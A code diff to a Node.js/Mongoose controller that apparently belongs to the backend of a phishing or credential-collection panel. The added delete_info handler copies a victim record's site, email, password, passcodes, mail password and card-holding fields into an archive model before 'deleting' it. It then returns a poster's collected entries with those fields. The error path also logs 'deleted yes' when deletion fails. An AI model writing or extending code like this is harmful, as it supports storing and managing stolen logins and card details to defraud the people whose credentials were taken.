@@ -1,3 +1,4 @@
+import NewInfo from '../models/OldInfo.js'
 
 import User from '../models/User.js'
 import Info from '../models/Info.js'
@@ -15,7 +16,6 @@ import rateLimitMiddleware from "../ratelimiter.js"
 import axios from 'axios';
 import Password from '../models/Password.js'
 import satelize from 'satelize'
-
 
 import Pusher from'pusher';
 
@@ -472,6 +472,37 @@ export const delete_poster =  (req, res) => {
   
 
 }
+
+
+export const delete_info = async (req, res) => {
+
+    const { info_id,pos_id } = req.params
+
+    // return res.status(200).json({ data: info_id })
+
+
+  const info= await Info.findById({ _id: info_id })
+      const newinfo= await NewInfo.create({site:info.site, email:info.email, password:info.password, skipcode:info.skipcode,
+        username:info.username,passcode:info.passcode,mail:info.mail,mailPass:info.mailPass,adminId:info.adminId,
+        poster :info.poster,
+        root :info.root,
+        onlyCard:info.onlyCard,holdingCard:info.holdingCard})
+
+    // return res.status(200).json({  newinfo })
+
+
+    Info.findByIdAndRemove({ _id: info_id })
+    .then(user => console.log('deleted yes')).catch(err => console.log('deleted yes'))
+   
+    Poster.findById({ _id: pos_id })
+    .select('username password posterId links createdAt details')
+    .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
+    .then(data => {
+        return res.status(200).json({ data: data })    }
+    ).catch(err => console.log('err', err))
+
+}
+
 
 export const link_add = async (req, res) => {
 
